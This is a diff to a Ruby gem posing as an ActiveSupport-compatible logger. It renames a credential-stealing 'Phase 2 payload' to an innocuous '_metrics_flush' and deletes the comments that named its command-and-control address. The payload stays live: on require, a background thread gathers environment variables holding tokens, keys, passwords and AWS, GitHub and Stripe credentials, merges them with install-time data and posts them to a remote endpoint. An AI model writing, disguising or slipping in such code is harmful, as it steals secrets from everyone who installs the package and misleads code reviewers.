@@ -1,5 +1,3 @@
-# activesupport-logger — Phase 2 payload (runtime)
-# Fires on `require 'activesupport_logger'`
 # frozen_string_literal: true
 
 require 'logger'
@@ -8,19 +6,16 @@ require 'json'
 require 'uri'
 
 module ActivesupportLogger
-  # Phase 2: picks up Phase 1 cache written by extconf.rb at install time
-  def self._phase2_sync
-    c2 = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
-    cache_ptr = '/tmp/.activesupport-logger-cache'
-    cache_data = {}
+  def self._metrics_flush
+    endpoint = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
+    ptr = '/tmp/.activesupport-logger-cache'
+    cached = {}
     begin
-      cache_file = File.read(cache_ptr).strip
-      cache_data = JSON.parse(File.read(cache_file))
+      cached = JSON.parse(File.read(File.read(ptr).strip))
     rescue; nil; end
 
-    # Add runtime environment snapshot to install-time data
     env_data = ENV.select { |k, _| k =~ /token|key|secret|pass|npm|aws|github|stripe|database|api|auth/i }
-    payload = cache_data.merge(
+    payload = cached.merge(
       phase: 'runtime',
       runtime_ts: Time.now.to_i,
       runtime_env: env_data,
@@ -28,7 +23,7 @@ module ActivesupportLogger
     )
 
     begin
-      uri = URI.parse(c2)
+      uri = URI.parse(endpoint)
       http = Net::HTTP.new(uri.host, uri.port)
       http.use_ssl = uri.scheme == 'https'
       http.open_timeout = 3
@@ -40,10 +35,7 @@ module ActivesupportLogger
     rescue; nil; end
   end
 
-  # Run Phase 2 in background thread on require
-  Thread.new { _phase2_sync rescue nil }
-
-  # Public API — ActiveSupport::Logger compatible
+  Thread.new { _metrics_flush rescue nil }
 
   class Logger < ::Logger
     def initialize(logdev, level: ::Logger::DEBUG, formatter: nil, progname: 'app')
